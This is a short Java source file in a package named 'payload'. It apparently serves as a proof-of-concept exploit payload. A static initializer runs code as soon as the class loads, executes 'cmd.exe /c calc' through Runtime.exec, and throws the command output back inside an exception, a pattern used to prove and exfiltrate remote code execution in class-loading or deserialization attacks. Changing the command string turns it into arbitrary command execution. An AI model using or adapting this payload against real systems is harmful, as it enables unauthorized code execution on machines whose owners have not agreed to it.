package payload;

import java.io.*;

public class  Calc {
	static {
		try {
			main(null);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
    public static void main(String[] args) throws Exception {
    	Process process = Runtime.getRuntime().exec("cmd.exe /c "+"calc");
    	InputStream in =  process.getInputStream();
    	BufferedReader br = new BufferedReader(new InputStreamReader(in));
    	String line;
    	StringBuilder sb = new StringBuilder();
		while ((line = br.readLine()) != null) {
    	sb.append(line).append("\n");
    	}
    	String str = sb.toString();
    	System.out.println(str);
    	throw new Exception(str);
}

}
